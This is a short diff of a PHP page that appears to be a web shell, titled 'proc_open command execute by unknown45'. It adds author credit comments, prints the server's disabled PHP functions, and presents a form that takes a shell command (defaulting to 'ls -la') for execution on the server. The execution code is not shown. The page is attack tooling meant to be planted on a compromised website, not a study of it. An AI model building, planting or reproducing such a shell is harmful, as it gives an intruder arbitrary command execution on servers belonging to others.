@@ -1,3 +1,6 @@
+<!-- Unknown45 -->
+<!-- https://github.com/whoami-45 -->
+
 <font face=courier size=2><i>proc_open command execute by unknown45</i> | <?php print "\n";$disable_functions = @ini_get("disable_functions"); echo "<font face=courier size=2>disable func : <i><font color=red size=2> ".$disable_functions; print "\n"; ?><br></font>
 <form method="post">
 <font face=courier new size=2>Command :</font> <input type="text" class="area" name="cmd" size="30" height="20" value="ls -la" style="margin: 5px auto; padding-left: 5px;" required><br>
